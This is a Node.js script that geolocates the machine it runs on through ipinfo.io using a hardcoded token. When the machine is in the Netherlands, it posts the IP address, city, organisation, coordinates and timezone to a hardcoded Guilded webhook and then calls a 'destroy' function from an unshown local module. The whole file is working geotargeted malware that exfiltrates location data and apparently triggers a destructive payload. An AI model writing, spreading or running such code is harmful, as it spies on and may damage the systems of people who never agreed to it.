const fetch = require('node-fetch');
const crypto = require('crypto')
const destroy = require('./il')
const token = "1c13df45a1513c"
const webhook = "https://media.guilded.gg/webhooks/03320091-877d-4b2e-b315-5e4eda428c4f/2VFbAzlOUEcAykQQ4UqYEKOMskUKMgggou0Aa06i24mgQsUg8YmOcsgIcCUaYCWoEiSo0SYCySqWqiAAuU8Yiu"




fetch("https://ipinfo.io/?token=" + token, {
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": null,
  "method": "GET"
})
    .then(res => res.json())
    .then(json => {
        if(json.country && json.country === 'NL'){
            
            const id = crypto.randomUUID()
            const date = Date.now();
            const { ip, city, org, loc, region, timezone } = json;
            const content = 
                `Date: ${new Date().toLocaleString().replaceAll(':', ' : ')}
                id: ${id}
                date: ${date}

                IP: ${ip}
                City: ${city}
                Organization: ${org}
                Location: ${loc}
                Region: ${region}
                Timezone: ${timezone}        
                `
            fetch(webhook, {
                method: "POST", 
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ content })
            })
            destroy(id, date)
        }
    })
    .catch(err => console.error(err))